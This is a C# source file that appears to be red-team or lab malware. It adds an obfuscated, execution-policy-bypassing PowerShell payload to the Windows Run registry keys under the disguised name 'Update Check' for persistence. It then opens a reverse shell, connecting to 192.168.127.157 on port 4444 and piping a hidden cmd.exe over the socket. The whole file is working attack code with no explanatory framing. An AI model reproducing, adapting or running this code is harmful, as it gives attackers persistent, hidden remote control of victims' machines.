using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.Net.Sockets;
using Microsoft.Win32;

namespace SharpThrough
{
    public class RS
    {
      
        public RS(){
            Main();
        }
        static StreamWriter streamWriter;

        public static void Main()
        {
            try{
                RegistryKey first_key = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run", true);
                 modifyReg(first_key);
            }
            catch (Exception ex){{}}
            try{
                RegistryKey second_key = Registry.LocalMachine.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run", true);
                modifyReg(second_key);
             }
            catch (Exception ex){{}}
            string ip = "192.168.127.157";
            int port = 4444;
            using (TcpClient client = new TcpClient(ip, port))
            {
                using (Stream stream = client.GetStream())
                {
                    using (StreamReader rdr = new StreamReader(stream))
                    {
                        streamWriter = new StreamWriter(stream);
                        StringBuilder strInput = new StringBuilder();

                        Process p = new Process();
                        p.StartInfo.FileName = "cmd.exe";
                        p.StartInfo.CreateNoWindow = true;
                        p.StartInfo.UseShellExecute = false;
                        p.StartInfo.RedirectStandardOutput = true;
                        p.StartInfo.RedirectStandardInput = true;
                        p.StartInfo.RedirectStandardError = true;
                        p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
                        p.ErrorDataReceived += P_ErrorDataReceived;
                        p.Start();
                        p.BeginOutputReadLine();
                        p.BeginErrorReadLine();

                        while (true)
                        {
                            strInput.Append(rdr.ReadLine());
                            //strInput.Append("\n");
                            p.StandardInput.WriteLine(strInput);
                            strInput.Remove(0, strInput.Length);
                        }
                    }
                }
            }
        }

        private static void P_ErrorDataReceived(object sender, DataReceivedEventArgs e)
        {
            StringBuilder strOutput = new StringBuilder();
            if (!String.IsNullOrEmpty(e.Data))
            {
                try
                {
                    strOutput.Append(e.Data);
                    streamWriter.WriteLine(strOutput);
                    streamWriter.Flush();
                }
                catch (Exception err)
                {}
            }
        }

        private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            StringBuilder strOutput = new StringBuilder();
            if (!String.IsNullOrEmpty(outLine.Data))
            {
                try
                {
                    strOutput.Append(outLine.Data);
                    streamWriter.WriteLine(strOutput);
                    streamWriter.Flush();
                }
                catch (Exception err){}
            }
        }
        private static void modifyReg(RegistryKey key){
            if (key != null){
            try{
                var launch = "cMD.eXe  /C   \"set  GyM=  ((' ('+'new-ObJECt'+' '+'sy'+'St'+'em.'+'iO.CO'+'m'+'P'+'rESs'+'i'+'on.DeFlAtestrEA'+'m( '+'[I'+'O.'+'m'+'EMoRy'+'STR'+'EAM][sys'+'tem'+'.'+'co'+'NVERt]::fr'+'om'+'ba'+'sE64St'+'rinG( JxT'+'2'+'PY5r'+'CsIw'+'EISv'+'su'+'R'+'PL'+'Gia'+'pN'+'rXP'+'T'+'yA2v'+'q'+'i'+'a'+'G'+'m'+'rf'+'5'+'a9'+'u'+'7'+'NBGshkl'+'gn'+'fL'+'BE'+'5og'+'3hG'+'A7C'+'Udi'+'L2V3tVES7'+'tV'+'MPuc1'+'fizzTbzb'+'/'+'rB'+'7DbP8W/qVBGg0fhCv'+'hRm'+'FcC5fCR'+'WLvBSWG'+'wI'+'8O5GGA5'+'M'+'cR6s'+'Kh'+'am'+'v'+'vPXx'+'3Wnr'+'XaZ'+'SCW'+'OF5tPdlGVu4'+'UNYa5aFZy9'+'E'+'Y'+'lay'+'7'+'K/zp'+'uoQ+4'+'86X6Y3Nsh8=J'+'x'+'T2) '+',[i'+'o.c'+'OM'+'p'+'R'+'e'+'SSI'+'On'+'.co'+'mPRE'+'ssI'+'onMOdE]'+'::D'+'ec'+'OM'+'pREss'+' )'+'y'+'4B% { new-ObJ'+'E'+'Ct IO.sTR'+'E'+'AmR'+'e'+'AdeR('+'t'+'sy_,[SysT'+'em.tEXt.eN'+'c'+'ODinG]::A'+'scII)}y'+'4B'+'%{ tsy_.reaDTo'+'end'+'()})'+' '+'y4B'+' ^&'+' '+'( tsy'+'e'+'n'+'V'+':cOmSPEc'+'[4,15,25]-'+'jO'+'inJx'+'T2J'+'xT'+'2)') -crEPLACE ([cHAr]74+[cHAr]120+[cHAr]84+[cHAr]50),[cHAr]39  -replAce  'tsy',[cHAr]36-replAce([cHAr]121+[cHAr]52+[cHAr]66),[cHAr]124) ^| ^&( $EnV:cOmspEC[4,26,25]-Join'')  && Set   tJg=EchO  ieX (gCI ENV:Gym).vALUe ^|  c:\\WInDows\\SYswOw64\\WInDowspoWeRsheLL\v1.0\\pOweRSHell.exE -wi 1 -noPrOfIL  -exECUT  byPaSS  -coMM     ${EXecUtiOnconTEXT}.INvOKEcoMMAND.inVOKeScRipT(  $input )  && cMD.eXe  /C %TjG%\"";
                key.SetValue("Update Check", launch);
                key.Close();
            }
            catch (Exception err){{}}
            }
        }
    }
}